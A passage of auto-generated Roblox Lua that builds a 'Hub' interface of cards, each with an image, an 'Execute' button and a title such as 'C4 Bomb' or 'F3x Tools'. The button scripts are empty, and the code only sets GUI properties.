G2L["47"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["47"]["Thickness"] = 1.3;
G2L["47"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["48"] = Instance.new("ImageLabel", G2L["46"]);
G2L["48"]["BorderSizePixel"] = 0;
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["48"]["Image"] = [[rbxassetid://98893207641774]];
G2L["48"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["48"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["48"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["49"] = Instance.new("UICorner", G2L["48"]);
G2L["49"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["4a"] = Instance.new("UIGradient", G2L["48"]);
G2L["4a"]["Rotation"] = 90;
G2L["4a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["4b"] = Instance.new("TextButton", G2L["46"]);
G2L["4b"]["BorderSizePixel"] = 0;
G2L["4b"]["TextSize"] = 22;
G2L["4b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["4b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4b"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["Text"] = [[Execute]];
G2L["4b"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["4c"] = Instance.new("LocalScript", G2L["4b"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["4d"] = Instance.new("UICorner", G2L["4b"]);
G2L["4d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["4e"] = Instance.new("UICorner", G2L["46"]);
G2L["4e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["4f"] = Instance.new("TextLabel", G2L["46"]);
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["TextSize"] = 32;
G2L["4f"]["TextTransparency"] = 0.49;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["BackgroundTransparency"] = 1;
G2L["4f"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Text"] = [[Doge Army]];
G2L["4f"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["50"] = Instance.new("Frame", G2L["2f"]);
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["50"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["51"] = Instance.new("UIStroke", G2L["50"]);
G2L["51"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["51"]["Thickness"] = 1.3;
G2L["51"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["52"] = Instance.new("ImageLabel", G2L["50"]);
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["52"]["Image"] = [[rbxassetid://112198609303505]];
G2L["52"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["53"] = Instance.new("UICorner", G2L["52"]);
G2L["53"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["54"] = Instance.new("UIGradient", G2L["52"]);
G2L["54"]["Rotation"] = 90;
G2L["54"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["55"] = Instance.new("TextButton", G2L["50"]);
G2L["55"]["BorderSizePixel"] = 0;
G2L["55"]["TextSize"] = 22;
G2L["55"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["55"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Text"] = [[Execute]];
G2L["55"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["56"] = Instance.new("LocalScript", G2L["55"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["57"] = Instance.new("UICorner", G2L["55"]);
G2L["57"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["58"] = Instance.new("UICorner", G2L["50"]);
G2L["58"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["59"] = Instance.new("TextLabel", G2L["50"]);
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["TextSize"] = 32;
G2L["59"]["TextTransparency"] = 0.49;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["59"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["BackgroundTransparency"] = 1;
G2L["59"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Text"] = [[Dark Vex]];
G2L["59"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["5a"] = Instance.new("Frame", G2L["2f"]);
G2L["5a"]["BorderSizePixel"] = 0;
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["5a"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["5b"] = Instance.new("UIStroke", G2L["5a"]);
G2L["5b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["5b"]["Thickness"] = 1.3;
G2L["5b"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["5c"] = Instance.new("ImageLabel", G2L["5a"]);
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["5c"]["Image"] = [[rbxassetid://102024442717579]];
G2L["5c"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["5d"] = Instance.new("UICorner", G2L["5c"]);
G2L["5d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["5e"] = Instance.new("UIGradient", G2L["5c"]);
G2L["5e"]["Rotation"] = 90;
G2L["5e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["5f"] = Instance.new("TextButton", G2L["5a"]);
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["TextSize"] = 22;
G2L["5f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5f"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Text"] = [[Execute]];
G2L["5f"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["60"] = Instance.new("LocalScript", G2L["5f"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["61"] = Instance.new("UICorner", G2L["5f"]);
G2L["61"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["62"] = Instance.new("UICorner", G2L["5a"]);
G2L["62"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["63"] = Instance.new("TextLabel", G2L["5a"]);
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["TextSize"] = 32;
G2L["63"]["TextTransparency"] = 0.49;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["63"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["BackgroundTransparency"] = 1;
G2L["63"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Text"] = [[R6]];
G2L["63"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["64"] = Instance.new("Frame", G2L["2f"]);
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["64"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["65"] = Instance.new("UIStroke", G2L["64"]);
G2L["65"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["65"]["Thickness"] = 1.3;
G2L["65"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["66"] = Instance.new("ImageLabel", G2L["64"]);
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["66"]["Image"] = [[rbxassetid://138885605652898]];
G2L["66"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["67"] = Instance.new("UICorner", G2L["66"]);
G2L["67"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["68"] = Instance.new("UIGradient", G2L["66"]);
G2L["68"]["Rotation"] = 90;
G2L["68"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["69"] = Instance.new("TextButton", G2L["64"]);
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["TextSize"] = 22;
G2L["69"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["69"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["69"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Text"] = [[Execute]];
G2L["69"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["6a"] = Instance.new("LocalScript", G2L["69"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["6b"] = Instance.new("UICorner", G2L["69"]);
G2L["6b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["6c"] = Instance.new("UICorner", G2L["64"]);
G2L["6c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["6d"] = Instance.new("TextLabel", G2L["64"]);
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["TextSize"] = 32;
G2L["6d"]["TextTransparency"] = 0.49;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["BackgroundTransparency"] = 1;
G2L["6d"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Text"] = [[C4 Bomb]];
G2L["6d"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["6e"] = Instance.new("Frame", G2L["2f"]);
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["6e"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["6f"] = Instance.new("UIStroke", G2L["6e"]);
G2L["6f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6f"]["Thickness"] = 1.3;
G2L["6f"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["70"] = Instance.new("ImageLabel", G2L["6e"]);
G2L["70"]["BorderSizePixel"] = 0;
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["70"]["Image"] = [[rbxassetid://115530999244225]];
G2L["70"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["70"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["71"] = Instance.new("UICorner", G2L["70"]);
G2L["71"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["72"] = Instance.new("UIGradient", G2L["70"]);
G2L["72"]["Rotation"] = 90;
G2L["72"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["73"] = Instance.new("TextButton", G2L["6e"]);
G2L["73"]["BorderSizePixel"] = 0;
G2L["73"]["TextSize"] = 22;
G2L["73"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["73"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["73"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["73"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["73"]["Text"] = [[Execute]];
G2L["73"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["74"] = Instance.new("LocalScript", G2L["73"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["75"] = Instance.new("UICorner", G2L["73"]);
G2L["75"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["76"] = Instance.new("UICorner", G2L["6e"]);
G2L["76"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["77"] = Instance.new("TextLabel", G2L["6e"]);
G2L["77"]["BorderSizePixel"] = 0;
G2L["77"]["TextSize"] = 32;
G2L["77"]["TextTransparency"] = 0.49;
G2L["77"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["77"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["77"]["BackgroundTransparency"] = 1;
G2L["77"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["77"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["77"]["Text"] = [[F3x Tools]];
G2L["77"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["78"] = Instance.new("Frame", G2L["2f"]);
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["78"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["79"] = Instance.new("UIStroke", G2L["78"]);
G2L["79"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["79"]["Thickness"] = 1.3;
G2L["79"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["7a"] = Instance.new("ImageLabel", G2L["78"]);
G2L["7a"]["BorderSizePixel"] = 0;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["7a"]["Image"] = [[rbxassetid://99949640024663]];
G2L["7a"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["7b"] = Instance.new("UICorner", G2L["7a"]);
G2L["7b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["7c"] = Instance.new("UIGradient", G2L["7a"]);
G2L["7c"]["Rotation"] = 90;
G2L["7c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["7d"] = Instance.new("TextButton", G2L["78"]);
G2L["7d"]["BorderSizePixel"] = 0;
G2L["7d"]["TextSize"] = 22;
G2L["7d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7d"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["7d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7d"]["Text"] = [[Execute]];
G2L["7d"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["7e"] = Instance.new("LocalScript", G2L["7d"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["7f"] = Instance.new("UICorner", G2L["7d"]);
G2L["7f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["80"] = Instance.new("UICorner", G2L["78"]);
G2L["80"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["81"] = Instance.new("TextLabel", G2L["78"]);
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["TextSize"] = 32;
G2L["81"]["TextTransparency"] = 0.49;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["81"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["BackgroundTransparency"] = 1;
G2L["81"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["Text"] = [[Death Sherif]];
G2L["81"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["82"] = Instance.new("Frame", G2L["2f"]);
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["82"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["83"] = Instance.new("UIStroke", G2L["82"]);
G2L["83"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["83"]["Thickness"] = 1.3;
G2L["83"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["84"] = Instance.new("ImageLabel", G2L["82"]);
G2L["84"]["BorderSizePixel"] = 0;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["84"]["Image"] = [[rbxassetid://92116086047708]];
G2L["84"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["84"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["85"] = Instance.new("UICorner", G2L["84"]);
G2L["85"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["86"] = Instance.new("UIGradient", G2L["84"]);
G2L["86"]["Rotation"] = 90;
G2L["86"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["87"] = Instance.new("TextButton", G2L["82"]);
G2L["87"]["BorderSizePixel"] = 0;
G2L["87"]["TextSize"] = 22;
G2L["87"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["87"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["87"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["87"]["Text"] = [[Execute]];
G2L["87"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["88"] = Instance.new("LocalScript", G2L["87"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["89"] = Instance.new("UICorner", G2L["87"]);
G2L["89"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["8a"] = Instance.new("UICorner", G2L["82"]);
G2L["8a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["8b"] = Instance.new("TextLabel", G2L["82"]);
G2L["8b"]["BorderSizePixel"] = 0;
G2L["8b"]["TextSize"] = 32;
G2L["8b"]["TextTransparency"] = 0.49;
G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8b"]["BackgroundTransparency"] = 1;
G2L["8b"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["8b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["Text"] = [[John Doe]];
G2L["8b"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["8c"] = Instance.new("Frame", G2L["2f"]);
G2L["8c"]["BorderSizePixel"] = 0;
G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["8c"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["8c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8c"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["8d"] = Instance.new("UIStroke", G2L["8c"]);
G2L["8d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["8d"]["Thickness"] = 1.3;
G2L["8d"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["8e"] = Instance.new("ImageLabel", G2L["8c"]);
G2L["8e"]["BorderSizePixel"] = 0;
G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8e"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["8e"]["Image"] = [[rbxassetid://77063341160612]];
G2L["8e"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8e"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["8f"] = Instance.new("UICorner", G2L["8e"]);
G2L["8f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["90"] = Instance.new("UIGradient", G2L["8e"]);
G2L["90"]["Rotation"] = 90;
